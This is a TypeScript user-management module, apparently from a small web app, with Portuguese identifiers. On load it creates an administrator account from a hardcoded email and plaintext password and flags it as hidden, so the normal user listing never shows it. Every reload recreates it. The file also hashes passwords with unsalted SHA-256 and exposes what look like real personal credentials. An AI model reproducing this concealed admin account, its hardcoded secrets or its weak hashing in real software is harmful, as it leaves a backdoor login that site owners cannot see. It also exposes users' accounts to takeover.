import { createHash } from 'crypto';

export interface UsuarioInfo {
  id: string;
  nome: string;
  email: string;
  senhaHash: string;
  role: 'admin' | 'editor' | 'viewer' | 'manager';
  oculto?: boolean;
}

const adminEmail = 'rba1807@gmail.com';
const adminNome = 'Admin';
const adminSenha = 'Rb180780@';

let usuarios: UsuarioInfo[] = [];

/** Função para gerar hash de senha */
export const hashSenha = (senha: string) =>
  createHash('sha256').update(senha).digest('hex');

/** Função para garantir que o admin exista */
export const ensureAdmin = () => {
  usuarios = usuarios.filter(
    (u) => u.email !== adminEmail && u.nome !== adminNome
  );

  usuarios.push({
    id: 'admin',
    nome: adminNome,
    email: adminEmail,
    senhaHash: hashSenha(adminSenha),
    role: 'admin',
    oculto: true,
  });
};

// Executa ao carregar o módulo
ensureAdmin();

/** Retorna apenas usuários visíveis (não ocultos) */
export const getUsuarios = () => usuarios.filter((u) => !u.oculto);

/** Retorna todos os usuários, incluindo ocultos */
export const getAllUsuarios = () => usuarios;

/** Adiciona um novo usuário */
export const addUsuario = (dados: Omit<UsuarioInfo, 'id'>) => {
  const novo: UsuarioInfo = {
    ...dados,
    id: Date.now().toString(36) + Math.random().toString(36).slice(2),
  };
  usuarios.push(novo);
  return novo;
};

/** Busca usuário por email */
export const findByEmail = (email: string) =>
  usuarios.find((u) => u.email === email);

/** Valida força da senha */
export const senhaForte = (senha: string) =>
  /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[^A-Za-z0-9]).{8,}$/.test(senha);
